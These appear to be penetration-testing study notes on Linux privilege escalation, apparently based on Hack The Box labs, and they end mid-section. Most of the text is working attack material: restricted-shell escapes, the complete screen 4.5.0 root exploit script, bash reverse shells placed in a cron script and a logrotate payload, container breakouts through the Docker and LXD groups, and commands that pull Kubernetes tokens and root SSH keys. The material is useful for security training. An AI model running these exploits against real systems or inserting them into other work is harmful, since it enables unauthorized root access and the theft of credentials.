[Restricted Bourne shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) (`rbash`) is a restricted version of the Bourne shell, a standard command-line interpreter in Linux which limits the user's ability to use certain features of the Bourne shell, such as changing directories, setting or modifying environment variables, and executing commands in other directories. It is often used to provide a safe and controlled environment for users who may accidentally or intentionally damage the system.

## RKSH

[Restricted Korn shell](https://www.ibm.com/docs/en/aix/7.2?topic=r-rksh-command) (`rksh`) is a restricted version of the Korn shell, another standard command-line interpreter. The `rksh` shell limits the user's ability to use certain features of the Korn shell, such as executing commands in other directories, creating or modifying shell functions, and modifying the shell environment.

## RZSH

[Restricted Z shell](https://manpages.debian.org/experimental/zsh/rzsh.1.en.html) (`rzsh`) is a restricted version of the Z shell and is the most powerful and flexible command-line interpreter. The `rzsh` shell limits the user's ability to use certain features of the Z shell, such as running shell scripts, defining aliases, and modifying the shell environment.

## Escaping

### Command Injection

In some cases, it may be possible to escape from a restricted shell by injecting commands into the command line or other inputs the shell accepts.

Imagine the shell only allows us to execute the `ls` command with a specific set of arguments, such as `ls -l` or `ls -a`, but it does not allow us to execute any other commands. In this situation, we can use command injection to escape from the shell by injecting additional commands into the argument of the `ls` command.

```bash
$ ls -l `pwd` 
```

### Command Substitution

It may be possible to escape from the shell by executing a command in a backticks substitution that is not restricted by the shell. 

### Command Chaining

We would need to use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (`;`) or a vertical bar (`|`), to execute a command. 

### Environment Var

If the shell uses an environment variable to specify the directory in which commands are executed, it may be possible to escape from the shell by modifying the value of the environment variable to specify a different directory.

### Shell Functions

Let us say, the shell allows users to define and call shell functions, it may be possible to escape from the shell by defining a shell function that executes a command.

### Step 1 : Reconnaisance

- run <mark style="background: #FFF3A3A6;">env </mark>to see environment. (or <mark style="background: #ABF7F7A6;">set</mark>)
- echo <mark style="background: #FF5582A6;">$PATH</mark>
- echo <mark style="background: #BBFABBA6;">$SHELL</mark>
- try basic unix command :
	- ls, pwd, cd, for, while, set, export, vi, cp, mv

We can also use `compgen -c` to check what commands we are allowed to use.
### Step 2: Quick Wins

- if '/' are allowed : `/bin/sh`
- if you can set PATH or SHELL
	- `export PATH=/bin:/usr/bin:$PATH`
	- `export SHELL=/bin/bash`
- if you can copy file to your PATH
	- `cp /bin/bash /your/path; bash`

### Step 3 : commands may execute other commands

- ftp : `!/bin/sh`
- gdb : `/bin/sh`
- vi / vim : `vim --cmd "set shell=/bin/bash" --cmd "shell"`
- `scp -S /tmp/getMeout.sh x y:`
- `awk 'BEGIN {system("/bin/sh")}'`
- `find / -exec /bin/sh \; -quit`

Check [GTFObins](https://gtfobins.github.io/) for more commands. #gtfobins
### Step 4 : ssh

- `ssh user@machine -t "/bin/bash"`
- `ssh user@machine -t "bash --noprofile`
- `ssh user@machine -t "() { :; }; /bin/bash`

```bash
> ssh -l htb-user 10.129.205.109 -t "bash --noprofile"
htb-user@10.129.205.109s password:

^Chtb-user@ubuntu:~$
htb-user@ubuntu:~$ ls
bin  flag.txt
htb-user@ubuntu:~$ echo $0
/bin/rbash
htb-user@ubuntu:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

### Step 5 : Advanced

- `echo "Your evil code" | tee script.sh`
- `python -c 'import os; os.system("/bin/bash")'`
- `perl -e 'exec "/bin/bash";'`


## Cat Without Cat

```bash
while read line; do
  echo $line;
done <file.txt
```

```bash
exec 3<file.txt # Assign file descriptor 3 for reading
while read -u 3 line; do
  echo $line
done
```

```bash
echo "$(<file.txt)"
```

```bash
ul < /file
```

```bash
tac /file | tac
```


# Special Permissions

## setuid

The `Set User ID upon Execution` (`setuid`) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges.

```bash
$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-xr-x 1 root root 40152 Nov 30  2017 /bin/mount
-rwsr-xr-x 1 root root 40128 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 27608 Nov 30  2017 /bin/umount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 23376 Jan 18  2016 /usr/bin/pkexec
-rwsr-xr-x 1 root root 39904 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 17  2017 /usr/bin/chsh
```

## setgid

The Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them.

```bash
find / -uid 0 -perm -6000 -type f 2>/dev/null.
```

## GTFOBins

The [GTFOBins](https://gtfobins.github.io/) project is a curated list of binaries and scripts that can be used by an attacker to bypass security restrictions.

```bash
$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

# id
uid=0(root) gid=0(root) groups=0(root)
```

# Sudo Rights Abuse

When landing on a system, we should always check to see if the current user has any sudo privileges by typing `sudo -l`. Sometimes we will need to know the user's password to list their `sudo` rights, but any rights entries with the `NOPASSWD` option can be seen without entering a password.

```bash
$ sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

# Privileged Groups

## LXC / LXD

LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at <mark style="background: #FF5582A6;">`/mnt/root`</mark>.

```bash
$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

```shell
$ unzip alpine.zip 

Archive:  alpine.zip
extracting: 64-bit Alpine/alpine.tar.gz  
inflating: 64-bit Alpine/alpine.tar.gz.root  
cd 64-bit\ Alpine/
```

```shell
$ lxd init

Do you want to configure a new storage pool (yes/no) [default=yes]? yes
Name of the storage backend to use (dir or zfs) [default=dir]: dir
Would you like LXD to be available over the network (yes/no) [default=no]? no
Do you want to configure the LXD bridge (yes/no) [default=yes]? yes

/usr/sbin/dpkg-reconfigure must be run as root
error: Failed to configure the bridge
```

```shell
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b
```

Start a privileged container with the `security.privileged` set to `true` to run the container without a UID mapping, making the root user in the container the same as the root user on the host.

```shell
$ lxc init alpine r00t -c security.privileged=true

Creating r00t
```

Mount the host file system

```shell
$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

Device mydev added to r00t
```

Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root.

```bash
$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ # 
```

## Docker

Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command 

```bash
docker run -v /root:/mnt -it ubuntu
```

## Disk

Users within the disk group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device used by the operating system. An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.

## ADM

Members of the adm group are able to read all logs stored in `/var/log`. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.

```bash
$ id

uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```

# Capabilities

## Set Capability

When capabilities are set for a binary, it means that the binary will be able to perform specific actions that it would not be able to perform without the capabilities. For example, if the `cap_net_bind_service` capability is set for a binary, the binary will be able to bind to network ports, which is a privilege usually restricted.

```bash
$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```


Several Linux capabilities can be used to escalate a user's privileges to `root`, including:

| **Capability**     | **Description**                                                                                                                                                                                                              |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cap_setuid`       | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user.                                                                                          |
| `cap_setgid`       | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group.                                                                                                 |
| `cap_sys_admin`    | This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems. |
| `cap_dac_override` | Allows bypassing of file read, write, and execute permission checks.                                                                                                                                                         |

## Enumerating Capabilities

```bash
$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

```bash
$ getcap -r / 2>/dev/null  
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip  
/usr/bin/ping = cap_net_raw+ep  
/usr/bin/traceroute6.iputils = cap_net_raw+ep  
/usr/bin/mtr-packet = cap_net_raw+ep  
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

```bash
htb-student@ubuntu:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_dac_override+eip
/snap/core20/1169/usr/bin/ping = cap_net_raw+ep
/snap/core20/1891/usr/bin/ping = cap_net_raw+ep
/snap/core22/750/usr/bin/ping = cap_net_raw+ep
/snap/core22/634/usr/bin/ping = cap_net_raw+ep
htb-student@ubuntu:~$
htb-student@ubuntu:~$
htb-student@ubuntu:~$ ls /root/
ls: cannot open directory '/root/': Permission denied
htb-student@ubuntu:~$ vim
htb-student@ubuntu:~$ vim /root/flag.txt
htb-student@ubuntu:~$ vim /etc/passwd
htb-student@ubuntu:~$ su -
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# whoami
root
root@ubuntu:~#
```
## Exploit

```bash
$ getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```

We can use the `cap_dac_override` capability of the `/usr/bin/vim` binary to modify a system file:

```bash
$ /usr/bin/vim.basic /etc/passwd


$ cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```


# Vulnerable Services

An example is the popular terminal multiplexer [Screen](https://linux.die.net/man/1/screen). Version 4.5.0 suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file.

This allows an attacker to truncate any file or create a file owned by root in any directory and ultimately gain full root access.

```bash
$ screen -v

Screen version 4.05.00 (GNU) 10-Dec-16
```

```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

# Cron Job Abuse

The `crontab` command can create a cron file, which will be run by the cron daemon on the schedule specified.  When created, the cron file will be created in `/var/spool/cron` for the specific user that creates it. 

Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, commands.  For example, the entry `0 */12 * * * /home/admin/backup.sh` would run every 12 hours.

First, let's look around the system for any writeable files or directories.

```bash
$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/fs/cgroup/memory/init.scope/cgroup.event_control

<SNIP>
/home/backupsvc/backup.sh
```

## Pspy

We can confirm that a cron job is running using [pspy](https://github.com/DominicBreuker/pspy), a command-line tool used to view running processes without the need for root privileges.

Let's run `pspy` and have a look. The `-pf` flag tells the tool to print commands and file system events and `-i 1000` tells it to scan [procfs](https://man7.org/linux/man-pages/man5/procfs.5.html) every 1000ms

```bash
$ ./pspy64 -pf -i 1000

pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scannning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2020/09/04 20:45:03 CMD: UID=0    PID=999    | /usr/bin/VGAuthService 
2020/09/04 20:45:03 CMD: UID=111  PID=990    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation 
2020/09/04 20:45:03 CMD: UID=0    PID=99     | 
2020/09/04 20:45:03 CMD: UID=0    PID=988    | /usr/lib/snapd/snapd 

<SNIP>
2020/09/04 20:46:01 CMD: UID=0    PID=2199   | /usr/sbin/CRON -f 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2203   | 
2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2204   | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2205   | gzip 
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:03 CMD: UID=0    PID=2206   | /bin/bash /dmz-backups/backup.sh 
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
```

We can modify the script to add a [Bash one-liner reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

```bash
$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38882
bash: cannot set terminal process group (9143): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id
id
uid=0(root) gid=0(root) groups=0(root)

```

# Containers

## Linux Containers

Before we can use this service to escalate our privileges, we must be in either the `lxc` or `lxd` group. We can find this out with the following command:

## Importing Images

```bash
$ id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

```bash
$ cd ContainerImages
container-user@nix02:~$ ls

ubuntu-template.tar.xz
```

```bash
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list
```

## Creating Instance From Image

```bash
> lxc image alias create alpineimg b14f17d61b9d
> lxc image list
```

After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the `security.privileged` flag and the root path for the container.

## Set security.privileged on the instance

```bash
$ lxc init ubuntutemp privesc -c security.privileged=true
```

```bash
$ lxc init alpineimg alpineroot
Creating alpineroot
$ lxc list
+------------+---------+---------------------+------+-----------+-----------+
|    NAME    |  STATE  |        IPV4         | IPV6 |   TYPE    | SNAPSHOTS |
+------------+---------+---------------------+------+-----------+-----------+
| alpineroot | STOPPED |                     |      | CONTAINER | 0         |
+------------+---------+---------------------+------+-----------+-----------+
| ubuntu     | RUNNING | 10.134.16.30 (eth0) |      | CONTAINER | 0         |
+------------+---------+---------------------+------+-----------+-----------+

$ lxc config set alpineroot security.privileged=true
```

```bash
$ lxc config show alpineroot
architecture: x86_64
config:
..SNIP..
  security.privileged: "true"
..SNIP..
profiles:
- default
stateful: false
description: ""
```

## Add mounting device to instance

```bash
$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

```bash
$ lxc config device add alpineroot hostdir disk source=/ path=/mnt/root recursive=true
Device hostdir added to alpineroot

$ lxc config show alpineroot
architecture: x86_64
config:
...SNIP...
  security.privileged: "true"
...SNIP...
devices:
  hostdir:
    path: /mnt/root
    recursive: "true"
    source: /
    type: disk
...SNIP...
```

Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the `resource` of the host system as `root`.

```bash
$ lxc start privesc
$ lxc exec privesc /bin/bash

# ls -l /mnt/root
```


# Docker

## Docker Sockets

A Docker socket or Docker daemon socket is a special file that allows us and processes to communicate with the Docker daemon. This communication occurs either through a Unix socket or a network socket, depending on the configuration of our Docker setup. It acts as a bridge, facilitating communication between the Docker client and the Docker daemon. When we issue a command through the Docker CLI, the Docker client sends the command to the Docker socket, and the Docker daemon, in turn, processes the command and carries out the requested actions.

```bash
$ ls -al

total 8
drwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 .
drwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
```

From here on, we can use the docker binary to interact with the socket and enumerate what docker containers are already running.

```bash
tmp$ wget https://<parrot-os>:443/docker -O docker
tmp$ chmod +x docker
tmp$ ls -l

tmp$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago    Up 12 minutes    443/tcp   app
<SNIP>
```

We can create our own Docker container that maps the host’s root directory (/) to the /hostsystem directory on the container.

```bash
$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app

/tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES
7ae3bcc818af     main_app      "/docker-entry.s..."    12 seconds ago    Up 8 seconds     443/tcp   app
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago        Up 17 minutes    443/tcp   app
```

Now, we can log in to the new privileged Docker container with the ID 7ae3bcc818af and navigate to the /hostsystem.

```bash
$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
```

## Docker Group

To gain root privileges through Docker, the user we are logged in with must be in the `docker` group. This allows him to use and control the Docker daemon.

```bash
$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

Alternatively, Docker may have SUID set, or we are in the Sudoers file, which permits us to run `docker` as root. All three options allow us to work with Docker to escalate our privileges.

```bash
$ docker image ls

REPOSITORY                           TAG                 IMAGE ID       CREATED         SIZE
ubuntu                       
```

A case that can also occur is when the Docker socket is writable. Usually, this socket is located in `/var/run/docker.sock`. However, the location can understandably be different. Because basically, this can only be written by the root or docker group.

```bash
$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

root@ubuntu:~# ls -l
```

# Kubernetes

## Kubelet API - Extracting Tokens

To gain higher privileges and access the host system, we can utilize a tool called [kubeletctl](https://github.com/cyberark/kubeletctl) to obtain the Kubernetes service account's `token` and `certificate` (`ca.crt`) from the server. To do this, we must provide the server's IP address, namespace, and target pod. In case we get this token and certificate, we can elevate our privileges even more, move horizontally throughout the cluster, or gain access to additional pods and resources.

```bash
kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw
```

## Kubelet API - Extracting Certificates

```bash
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
<SNIP>
MhxgN4lKI0zpxFBTpIwJ3iZemSfh3pY2UqX03ju4TreksGMkX/hZ2NyIMrKDpolD
602eXnhZAL3+dA==
-----END CERTIFICATE-----
```

## List Privileges

```bash
$ export token=`cat k8.token`
$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list

Resources										Non-Resource URLs	Resource Names	Verbs 
selfsubjectaccessreviews.authorization.k8s.io		[]					[]				[create]
selfsubjectrulesreviews.authorization.k8s.io		[]					[]				[create]
pods											[]					[]				[get create list]
...SNIP...
```

## Create new Pod

From here on, we can create a `YAML` file that we can use to create a new container and mount the entire root filesystem from the host system into this container's `/root` directory.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

```bash
$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml

pod/privesc created


$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods

NAME	READY	STATUS	RESTARTS	AGE
nginx	1/1		Running	0			23m
privesc	1/1		Running	0			12s
```

If the pod is running we can execute the command and we could spawn a reverse shell or retrieve sensitive data like private SSH key from the root user.

```bash
$ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc

-----BEGIN OPENSSH PRIVATE KEY-----
...SNIP...
```


# Logrotate

To exploit `logrotate`, we need some requirements that we have to fulfill.

1. we need `write` permissions on the log files
2. logrotate must run as a privileged user or `root`
3. vulnerable versions:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0

This exploit is named [logrotten](https://github.com/whotwagner/logrotten). We can download and compile it on a similar kernel of the target system and then transfer it to the target system. Alternatively, if we can compile the code on the target system, then we can do it directly on the target system.

```bash
$ git clone https://github.com/whotwagner/logrotten.git
$ cd logrotten
$ gcc logrotten.c -o logrotten
```

 In this example, we will run a simple bash-based reverse shell with the `IP` and `port` of our VM that we use to attack the target system.

```bash
$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

We need to determine which option `logrotate` uses in `logrotate.conf`.

```bash
$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"

create
```

Check which log files that is being rotated

```bash
$ sudo cat /var/lib/logrotate.status

/var/log/samba/log.smbd" 2022-8-3
/var/log/mysql/mysql.log" 2022-8-3
```
As a final step, we run the exploit with the prepared payload and wait for a reverse shell as a privileged user or root.

```bash
$ ./logrotten -p ./payload /var/log/mysql/mysql.log
```

# Weak NFS Privileges

```bash
$ showmount -e 10.129.2.12

Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *
```

When an NFS volume is created, various options can be set:

|Option|Description|
|---|---|
|`root_squash`|If the root user is used to access NFS shares, it will be changed to the `nfsnobody` user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the `nfsnobody` user, which prevents an attacker from uploading binaries with the SUID bit set.|
|`no_root_squash`|Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.|
For example, we can create a SETUID binary that executes `/bin/sh` using our local root user. 

@target-machine
```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

@target-machine
```bash
$ gcc shell.c -o shell
```

We can then mount the `/tmp` directory locally, copy the root-owned binary over to the NFS server, and set the SUID bit.

```bash
$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
$ sudo chown root:root /mnt/shell
$ sudo chmod u+s /mnt/shell
```

@target-machine
```bash
htb-student@NIX02:/tmp$ ./shell
root@NIX02:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1008(htb-student)
```

alternatively we can copy bash binary to nfs shared folder and set the SUID bit from our pwn box.

```bash
$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
$ sudo chown root:root /mnt/bash
$ sudo chmod u+s /mnt/bash
```

@target-machine

```bash
htb-student@NIX02:/tmp$ ./bash -p
bash-4.4# whoami
root
bash-4.4# id
uid=1008(htb-student) gid=1008(htb-student) euid=0(root) groups=1008(htb-student)
```

# Kernel Exploits

Kernel level exploits exist for a variety of Linux kernel versions. A very well-known example is [Dirty COW](https://github.com/dirtycow/dirtycow.github.io) (CVE-2016-5195). These leverage vulnerabilities in the kernel to execute code with root privileges. It is very common to find systems that are vulnerable to kernel exploits.

Privilege escalation using a kernel exploit can be as simple as downloading, compiling, and running it. Some of these exploits work out of the box, while others require modification. A quick way to identify exploits is to issue the command `uname -a` and search Google for the kernel version.

# Shared Libraries

Two types of libraries exist in Linux: `static libraries` (denoted by the .a file extension) and `dynamically linked shared object libraries` (denoted by the .so file extension). When a program is compiled, static libraries become part of the program and can not be altered. However, dynamic libraries can be modified to control the execution of the program that calls them.

There are multiple methods for specifying the location of dynamic libraries, so the system will know where to look for them on program execution. This includes the `-rpath` or `-rpath-link` flags when compiling a program, using the environmental variables `LD_RUN_PATH` or `LD_LIBRARY_PATH`, placing libraries in the `/lib` or `/usr/lib` default directories, or specifying another directory containing the libraries within the `/etc/ld.so.conf` configuration file.

Additionally, the `LD_PRELOAD` environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones. The shared objects required by a binary can be viewed using the `ldd` utility.

```bash
$ ldd /bin/ls

	linux-vdso.so.1 =>  (0x00007fff03bc7000)
	libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)
```

## LD_PRELOAD PrivEsc

For this, we need a user with `sudo` privileges.

```bash
$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

This user has rights to restart the Apache service as root, but since this is `NOT` a [GTFOBin](https://gtfobins.github.io/#apache) and the `/etc/sudoers` entry is written specifying the absolute path, this could not be used to escalate privileges under normal circumstances. However, we can exploit the `LD_PRELOAD` issue to run a custom shared library file. Let's compile the following `root.c` library:


```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

```bash
$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

```bash
$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```


- **`-fPIC`** → _Position Independent Code_. Required so the code can be loaded at any memory address (mandatory for shared libraries).
    
- **`-shared`** → produce a _shared object_ (`.so`) instead of an executable binary.
    
- **`-nostartfiles`** → tells GCC not to use the standard startup files (`crt0.o`, etc.). Usually used for low-level code, exploit development, or cases where you don’t want the default runtime initialization.

# Shared Object Hijacking

Programs and binaries under development usually have custom libraries associated with them. Consider the following `SETUID` binary.

```bash
$ ls -la payroll

